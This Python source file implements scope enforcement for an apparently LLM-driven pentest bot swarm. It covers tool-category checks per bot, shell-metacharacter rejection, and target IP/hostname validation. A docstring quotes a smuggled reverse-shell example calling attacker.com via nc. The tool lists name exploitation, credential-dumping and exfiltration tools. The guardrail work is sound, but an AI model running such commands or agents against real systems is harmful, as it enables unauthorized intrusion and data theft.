"""
Chimeras v2.0 — Scope Enforcement + Target Validation

Per-bot tool categories (NOT hardcoded tool lists).
The LLM decides which tools to run. Scope enforcer checks the tool
falls within the bot's authorized category.

Tools are discovered dynamically — no hardcoded tool names in bot agents.

v2 additions (Phase -1):
  - TargetValidator: extracts IP/hostname args from commands, resolves
    them, and rejects execution if the resolved target falls outside the
    mission scope. This is a CODE-LEVEL check, not a prompt instruction.
  - Shell metacharacter detection: rejects commands containing shell
    injection characters (;, &&, |, backticks, $()) unless the bot's
    category explicitly requires shell access (bash, python3).
"""

from typing import List, Dict, Set, Optional, Tuple
import shlex
import re
import shutil
import os
import ipaddress
import socket


# ─── Tool Categories ───
# Each category maps to a set of tool names that fall within that role.
# Bots reference categories, not individual tools.

TOOL_CATEGORIES: Dict[str, Set[str]] = {
    "passive_recon": {
        "dig", "host", "whois", "curl", "theHarvester", "subfinder",
        "amass", "crtsh", "dnsrecon", "fierce", "waybackurls",
        "ghdb", "shodan", "censys", "wafw00f", "whatweb",
        "dnsx", "httpx",
    },
    "active_scan": {
        "nmap", "masscan", "rustscan", "naabu", "nikto",
        "whatweb", "wpscan", "dirb", "gobuster", "ffuf",
        "httpx", "dnsx",
    },
    "vuln_detection": {
        "nmap", "nuclei", "searchsploit", "nikto",
        "vulners", "wapiti", "wafw00f", "ssh-audit",
        "sslscan", "testssl", "nmap-script",
    },
    "payload_fab": {
        "msfvenom", "msfconsole", "searchsploit", "curl",
    },
    "exploitation": {
        "msfconsole", "msfvenom", "sqlmap", "curl",
        "nc", "ncat", "python3", "bash", "exploit",
    },
    "privesc": {
        "linpeas", "winpeas", "pspy", "find", "cat", "ls",
        "python3", "bash", "ssh", "smbclient", "crackmapexec",
        "impacket-secretsdump", "mimikatz",
    },
    "exfiltration": {
        "curl", "wget", "nc", "python3", "bash", "tar", "gzip",
        "scp", "rsync",
    },
    "none": set(),
}


# ─── Bot → Category mapping ───
# Bots declare their category, not their tools.

BOT_CATEGORIES: Dict[str, str] = {
    "aria": "passive_recon",
    "lisa": "active_scan",
    "bloodhound": "vuln_detection",
    "pathologist": "payload_fab",
    "surgeon": "exploitation",
    "magician": "privesc",
    "thief": "exfiltration",
    "bookkeeper": "none",
    "warchief": "none",
}


# ─── Scope violation errors ───

class ScopeViolation(Exception):
    """Raised when a bot attempts to use a tool outside its scope."""
    def __init__(self, bot_name: str, tool: str):
        self.bot_name = bot_name
        self.tool = tool
        super().__init__(
            f"SCOPE VIOLATION: {bot_name} attempted to use '{tool}' — "
            f"not in its scope. Category: {BOT_CATEGORIES.get(bot_name, 'none')}"
        )


class TargetScopeViolation(Exception):
    """Raised when a command targets an IP/hostname outside the mission scope.

    This is a code-level enforcement — the LLM's judgment is NOT the only
    safeguard. Even if the LLM generates a command targeting an out-of-scope
    host, this check blocks it before subprocess execution.
    """
    def __init__(self, bot_name: str, target: str, scope: str):
        self.bot_name = bot_name
        self.target = target
        self.scope = scope
        super().__init__(
            f"TARGET SCOPE VIOLATION: {bot_name} attempted to target "
            f"'{target}' which is OUTSIDE the mission scope: {scope}"
        )


class ShellInjectionViolation(Exception):
    """Raised when a command contains shell metacharacters that bypass
    the category-based tool check.

    The v1 scope enforcer only inspects parts[0] — the first token. A command
    like `nmap 192.168.1.1; nc attacker.com -e /bin/sh` passes the check
    because parts[0] == "nmap". The semicolon and everything after it is
    invisible to the tool check but executes as a separate command via
    shell=True.

    This check rejects shell metacharacters unless the bot's category
    explicitly includes bash or python3 (tools that legitimately need
    shell features).
    """
    def __init__(self, bot_name: str, command: str, metachar: str):
        self.bot_name = bot_name
        self.command = command
        self.metachar = metachar
        super().__init__(
            f"SHELL INJECTION VIOLATION: {bot_name} command contains shell "
            f"metacharacter '{metachar}' which bypasses tool scope check. "
            f"Command: {command[:100]}"
        )


# ─── Shell metacharacter detection ───

# Characters that can chain commands or perform subshell execution.
# These bypass the first-token tool check when shell=True.
SHELL_METACHARACTERS = {
    ";",   # command separator
    "&&",  # logical AND — chain commands
    "||",  # logical OR — chain commands
    "|",   # pipe — redirects output to another command
    "`",   # backtick — command substitution
    "$(",  # command substitution (POSIX)
    ">",   # output redirection (can overwrite files)
    ">>",  # append redirection
    "<",   # input redirection
}

# Categories that legitimately need shell features.
# Only these categories are allowed to use shell metacharacters.
SHELL_CAPABLE_CATEGORIES = {
    "exploitation",   # bash, python3, nc — needs shell for payloads
    "privesc",        # bash, python3 — needs shell for enumeration scripts
    "exfiltration",   # bash, python3, tar — needs shell for pipelines
    "payload_fab",    # msfconsole, curl — may need shell for payload crafting
}


# ─── Target Validator ───

class TargetValidator:
    """Validates that command targets fall within the mission scope.

    This is a CODE-LEVEL check. The LLM should not be the only thing keeping
    the swarm inside scope. If the LLM generates a command targeting an
    out-of-scope host (through hallucination, prompt injection, or lateral
    movement without authorization), this check blocks execution.

    Usage:
        validator = TargetValidator(mission_scope="10.10.10.0/24")
        is_ok, reason = validator.validate_command(command, bot_name)
    """

    # Regex patterns for extracting targets from commands
    IP_REGEX = re.compile(
        r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/\d{1,2})?)\b'
    )
    # Hostname regex — matches domain-like patterns, excludes common flags
    HOSTNAME_REGEX = re.compile(
        r'\b([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?'
        r'(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+)\b'
    )

    # Patterns to exclude from hostname extraction (not targets)
    # Patterns to exclude from hostname extraction (not targets)
    NON_TARGET_PATTERNS = {
        # File paths
        re.compile(r'^/'), re.compile(r'^\./'), re.compile(r'^\.\./'),
        # Common flag values that look like domains
        re.compile(r'^http$', re.IGNORECASE), re.compile(r'^https$', re.IGNORECASE),
        # Tool output flags
        re.compile(r'^-'),
        # Common protocol strings
        re.compile(r'^tcp$', re.IGNORECASE), re.compile(r'^udp$', re.IGNORECASE),
        # File extensions that get matched
        re.compile(r'\.(txt|log|json|xml|html|md|py|sh|conf|cfg)$'),
        # nmap script-args values (e.g., ssl-cert.timeout=30, vulners.timeout=60)
        re.compile(r'^[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+=[a-zA-Z0-9._-]+$'),
        # nmap script names (e.g., ssl-cert, ssl-enum-ciphers, vulners)
        re.compile(r'^[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+$'),
        # Common nmap timing/template flags
        re.compile(r'^T[0-9]$'),
        # Version strings, output formats
        re.compile(r'^[A-Z]+$'),  # All-caps tokens like HTTP, HTTPS, OK
    }

    # nmap flags whose following argument is a value, not a target
    # These flags take arguments that can look like hostnames (script names, timing, etc.)
    NMAP_VALUE_FLAGS = {
        '--script', '--script-args', '--script-args-file', '--script-help',
        '-sV', '--version-intensity', '--version-light', '--version-all',
        '-T', '--timing', '--max-retries', '--max-rate', '--min-rate',
        '-p', '--port-ratio', '--exclude', '--exclude-file',
        '-oN', '-oX', '-oA', '-oG', '--reason', '--packet-trace',
        '-e', '--interface', '-S', '--source-ip',
        '--data-length', '--ttl', '--spoof-mac',
        '--proxies', '--resolve-all',
    }

    def __init__(self, mission_scope: str, internal_scope: Optional[str] = None):
        """Initialize with the mission's authorized scope.

        Args:
            mission_scope: IP, CIDR, or hostname from mission definition.
            internal_scope: Optional second scope for lateral movement
                           (only valid after lateral_approval gate).
        """
        self.mission_scope = mission_scope or ""
        self.internal_scope = internal_scope or ""
        self._scope_networks: List[ipaddress._BaseNetwork] = []
        self._scope_hosts: Set[str] = set()
        self._internal_networks: List[ipaddress._BaseNetwork] = []
        self._internal_hosts: Set[str] = set()
        self._parse_scope(mission_scope, self._scope_networks, self._scope_hosts)
        self._parse_scope(internal_scope, self._internal_networks, self._internal_hosts)

    def _parse_scope(self, scope: Optional[str], networks: list, hosts: set) -> None:
        """Parse a scope string into IP networks and hostnames.

        Handles:
          - Single IP: 10.10.10.5
          - CIDR: 10.10.10.0/24
          - Hostname: example.com
          - Multiple values separated by commas or newlines
        """
        if not scope:
            return
        for token in re.split(r'[,\n\s]+', scope.strip()):
            token = token.strip()
            if not token:
                continue
            # Try parsing as IP or CIDR
            try:
                if '/' in token:
                    networks.append(ipaddress.ip_network(token, strict=False))
                else:
                    networks.append(ipaddress.ip_network(token + '/32', strict=False))
            except ValueError:
                # Not an IP — treat as hostname
                hosts.add(token.lower())

    def _extract_targets(self, command: str) -> Tuple[List[str], List[str]]:
        """Extract IP addresses and hostnames from a command string.

        v2.1: Properly skips flag arguments (--script, --script-args, -T, etc.)
        so that values like 'ssl-cert.timeout=30' or 'ssl-enum-ciphers' are
        not mistaken for hostnames.

        Returns:
            (ip_list, hostname_list) — all potential targets found.
        """
        ips = self.IP_REGEX.findall(command)

        # Tokenize the command to skip flag arguments properly
        try:
            tokens = shlex.split(command)
        except Exception:
            tokens = command.split()

        # Build a set of "skip next token" flags
        skip_next = False
        candidate_hostnames = []
        all_tools = set()
        for tools in TOOL_CATEGORIES.values():
            all_tools |= tools

        for i, token in enumerate(tokens):
            # If previous token was a value-flag, skip this token
            if skip_next:
                skip_next = False
                continue

            # Check if this token is a value-flag (next token is a value, not target)
            if token in self.NMAP_VALUE_FLAGS:
                skip_next = True
                continue

            # Skip flags themselves
            if token.startswith('-'):
                continue

            # Skip tokens that contain '=' (flag values like key=value)
            if '=' in token:
                continue

            # Try to match as hostname
            matches = self.HOSTNAME_REGEX.findall(token)
            for match in matches:
                # Skip if it matches any non-target pattern
                skip = False
                for pattern in self.NON_TARGET_PATTERNS:
                    if pattern.search(match):
                        skip = True
                        break
                if skip:
                    continue
                # Skip if it's a known tool name
                if match.lower() in all_tools:
                    continue
                # Skip very short matches
                if len(match) < 4:
                    continue
                candidate_hostnames.append(match)

        return ips, candidate_hostnames

    def _is_ip_in_scope(self, ip_str: str) -> bool:
        """Check if an IP address falls within any authorized scope network."""
        try:
            # Strip CIDR suffix if present (for individual IP check)
            ip_addr_str = ip_str.split('/')[0]
            ip_addr = ipaddress.ip_address(ip_addr_str)
        except ValueError:
            return False

        # Check against all scope networks (external + internal)
        for network in self._scope_networks + self._internal_networks:
            if ip_addr in network:
                return True

        # Check exact host matches
        if ip_addr_str in self._scope_hosts or ip_str in self._scope_hosts:
            return True

        return False

    def _is_hostname_in_scope(self, hostname: str) -> bool:
        """Check if a hostname falls within the authorized scope.

        Direct match against scope hostnames. If the scope is a CIDR,
        we attempt DNS resolution to check if the hostname resolves to
        an in-scope IP. Resolution failure = treat as out-of-scope (fail safe).
        """
        hostname_lower = hostname.lower()

        # Direct hostname match
        if hostname_lower in self._scope_hosts or hostname_lower in self._internal_hosts:
            return True

        # If scope is hostname-based, check suffix matching
        # e.g., scope = "example.com" should allow "sub.example.com"
        for scope_host in self._scope_hosts | self._internal_hosts:
            if hostname_lower == scope_host:
                return True
            if hostname_lower.endswith('.' + scope_host):
                return True

        # If scope is IP/CIDR-based, try resolving the hostname
        if self._scope_networks or self._internal_networks:
            try:
                resolved = socket.gethostbyname(hostname_lower)
                if self._is_ip_in_scope(resolved):
                    return True
            except socket.gaierror:
                # Cannot resolve — fail safe (out of scope)
                pass

        return False

    def validate_command(self, command: str, bot_name: str = "") -> Tuple[bool, str]:
        """Validate that all targets in a command are within scope.

        Args:
            command: The shell command to validate.
            bot_name: Name of the bot (for error messages).

        Returns:
            (is_valid: bool, reason: str)
            - (True, "OK") if all targets are in scope or no targets found
            - (False, reason) if any target is out of scope
        """
        if not self.mission_scope and not self.internal_scope:
            # No scope defined — allow (missions without explicit scope)
            return True, "No scope defined — skipping target validation"

        ips, hostnames = self._extract_targets(command)

        for ip in ips:
            if not self._is_ip_in_scope(ip):
                return False, (
                    f"TARGET OUT OF SCOPE: IP {ip} is not within mission scope "
                    f"({self.mission_scope})"
                )

        for hostname in hostnames:
            if not self._is_hostname_in_scope(hostname):
                return False, (
                    f"TARGET OUT OF SCOPE: hostname '{hostname}' is not within "
                    f"mission scope ({self.mission_scope})"
                )

        return True, "OK"

    def validate_target_list(self, targets: List[str]) -> Tuple[bool, str]:
        """Validate a list of target strings (IPs or hostnames).

        Used for validating WarChief's discovered targets before adding
        them to state.
        """
        for target in targets:
            # Try as IP
            try:
                ip_addr_str = target.split('/')[0]
                ipaddress.ip_address(ip_addr_str)
                if not self._is_ip_in_scope(target):
                    return False, f"Target {target} (IP) is out of scope"
                continue
            except ValueError:
                pass

            # Try as hostname
            if not self._is_hostname_in_scope(target):
                return False, f"Target {target} (hostname) is out of scope"

        return True, "OK"


# ─── Shell metacharacter checker ───

def check_shell_injection(command: str, bot_name: str) -> Tuple[bool, str]:
    """Check if a command contains shell metacharacters that bypass
    the tool-category check.

    The v1 scope enforcer only looks at the first token (parts[0]). With
    shell=True, anything after ;, &&, |, backticks, or $() executes as a
    separate command — invisible to the tool check.

    This function rejects metacharacters UNLESS the bot's category is in
    SHELL_CAPABLE_CATEGORIES (exploitation, privesc, exfiltration, payload_fab).

    Args:
        command: The shell command to check.
        bot_name: Name of the bot.

    Returns:
        (is_safe: bool, reason: str)
        - (True, "OK") if no injection risk or category allows shell features
        - (False, reason) if metacharacters detected and category doesn't allow them
    """
    category = BOT_CATEGORIES.get(bot_name, "none")

    # Shell-capable categories are allowed to use metacharacters
    if category in SHELL_CAPABLE_CATEGORIES:
        return True, f"OK (category '{category}' allows shell features)"

    # Check for each dangerous metacharacter
    # We need to be careful: | can appear in nmap scripts, > in redirects, etc.
    # But for non-shell categories, these should never appear.
    for metachar in [";", "&&", "||", "`", "$(", "|", ">", "<"]:
        if metachar in command:
            # Allow pipe in specific cases: nmap -oG - | grep (but nmap doesn't need this
            # since we capture stdout directly). For non-shell categories, reject all.
            return False, (
                f"SHELL INJECTION RISK: command contains '{metachar}' which "
                f"bypasses tool scope check. Category '{category}' does not "
                f"allow shell features. Use shell-capable tools (bash/python3) "
                f"for complex commands."
            )

    return True, "OK"


# ─── Scope Enforcer (v1 + v2 integration) ───

class ScopeEnforcer:
    """Enforces per-bot tool categories. Not hardcoded tool lists.

    v2: Also enforces target validation and shell metacharacter checks.
    """

    # Shell control flow keywords — not tools, but bash constructs
    SHELL_KEYWORDS = {
        "for", "while", "if", "case", "until", "select",
        "{", "(", "[[",
    }

    @staticmethod
    def get_bot_category(bot_name: str) -> str:
        """Return the tool category for a bot."""
        return BOT_CATEGORIES.get(bot_name, "none")

    @staticmethod
    def get_allowed_tools(bot_name: str) -> Set[str]:
        """Return the set of allowed tools for a bot based on its category."""
        category = BOT_CATEGORIES.get(bot_name, "none")
        return TOOL_CATEGORIES.get(category, set())

    @staticmethod
    def _discover_installed_tools() -> Set[str]:
        """Dynamically discover which tools are actually installed on the system."""
        installed = set()
        for category_tools in TOOL_CATEGORIES.values():
            for tool in category_tools:
                if shutil.which(tool) or os.path.isfile(f"/usr/local/bin/{tool}") or os.path.isfile(f"/usr/bin/{tool}"):
                    installed.add(tool)
        return installed

    @staticmethod
    def describe_scope(bot_name: str) -> str:
        """Return human-readable scope description for a bot."""
        category = BOT_CATEGORIES.get(bot_name, "none")
        if category == "none":
            return f"{bot_name}: No tool execution (reads/writes files only)"
        tools = TOOL_CATEGORIES.get(category, set())
        installed = ScopeEnforcer._discover_installed_tools()
        available = tools & installed
        missing = tools - installed
        desc = f"{bot_name} [{category}]: {', '.join(sorted(available))}"
        if missing:
            desc += f" (not installed: {', '.join(sorted(missing))})"
        return desc

    @staticmethod
    def check(bot_name: str, command: str,
              mission_scope: Optional[str] = None,
              internal_scope: Optional[str] = None) -> Tuple[bool, str]:
        """
        Check if a command is within the bot's scope.

        v2: Performs three checks in order:
        1. Shell metacharacter injection check
        2. Tool category check (v1)
        3. Target/CIDR validation (v2)

        Args:
            bot_name: Name of the bot.
            command: The shell command to check.
            mission_scope: Mission scope string (IP/CIDR/hostname) for target validation.
            internal_scope: Optional lateral movement scope (after approval gate).

        Returns:
            (allowed: bool, reason: str)
        """
        # ─── Check 1: Shell metacharacter injection (v2 Phase -1) ───
        injection_safe, injection_reason = check_shell_injection(command, bot_name)
        if not injection_safe:
            return False, injection_reason

        # ─── Check 2: Tool category check (v1) ───
        allowed_tools = ScopeEnforcer.get_allowed_tools(bot_name)

        # Bookkeeper and WarChief don't run tools at all
        if not allowed_tools:
            return False, f"{bot_name} has no tool execution permissions"

        # Parse the command to find the base tool
        try:
            parts = shlex.split(command)
            if not parts:
                return False, "Empty command"
            tool = parts[0]
            # Handle paths like /usr/bin/nmap → nmap
            if "/" in tool:
                tool = tool.split("/")[-1]
        except Exception:
            tool = command.strip().split()[0] if command.strip() else ""
            if "/" in tool:
                tool = tool.split("/")[-1]

        # If first word is a shell keyword (for/while/if), check if bash is allowed
        if tool in ScopeEnforcer.SHELL_KEYWORDS:
            if "bash" in allowed_tools:
                return True, "OK (bash control flow)"
            for allowed_tool in allowed_tools:
                if re.search(rf'\b{re.escape(allowed_tool)}\b', command):
                    return True, f"OK (shell wrapper around {allowed_tool})"
            return False, f"SCOPE VIOLATION: {bot_name} cannot use shell control flow '{tool}'. Allowed: {sorted(allowed_tools)}"

        if tool not in allowed_tools:
            return False, f"SCOPE VIOLATION: {bot_name} cannot use '{tool}'. Allowed: {sorted(allowed_tools)}"

        # ─── Check 3: Target/CIDR validation (v2 Phase -1) ───
        if mission_scope:
            validator = TargetValidator(mission_scope, internal_scope)
            target_ok, target_reason = validator.validate_command(command, bot_name)
            if not target_ok:
                return False, target_reason

        return True, "OK"

    @staticmethod
    def enforce(bot_name: str, command: str,
                mission_scope: Optional[str] = None,
                internal_scope: Optional[str] = None) -> str:
        """
        Enforce scope. Raises ScopeViolation, TargetScopeViolation,
        or ShellInjectionViolation if violated.

        v2: Pass mission_scope and internal_scope for target validation.
        Returns the command if allowed.
        """
        # Check shell injection first
        injection_safe, injection_reason = check_shell_injection(command, bot_name)
        if not injection_safe:
            raise ShellInjectionViolation(
                bot_name, command,
                next((m for m in [";", "&&", "||", "`", "$(", "|", ">", "<"] if m in command), "?")
            )

        # Tool category check
        allowed, reason = ScopeEnforcer.check(bot_name, command, mission_scope, internal_scope)
        if not allowed:
            # Distinguish target violation from tool violation
            if "TARGET OUT OF SCOPE" in reason:
                raise TargetScopeViolation(bot_name, "", mission_scope or "")
            raise ScopeViolation(bot_name, command.split()[0] if command.split() else "unknown")

        return command